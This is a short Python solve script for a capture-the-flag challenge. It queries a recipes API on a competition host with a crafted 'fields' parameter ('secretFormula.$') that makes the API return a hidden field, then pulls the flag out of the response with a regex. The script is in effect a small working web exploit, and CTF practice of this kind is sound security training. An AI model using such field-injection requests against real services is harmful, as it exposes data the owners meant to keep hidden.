import requests
import re

url = "http://chals.cyberthon26f.ctf.sg:41629/"

res = requests.get(f'{url}/api/recipes', params={
    'fields': 'secretFormula.$'
})

flag = re.findall(r'(Cyberthon{.+?})', res.text)[0].strip()
print("Flag:", flag)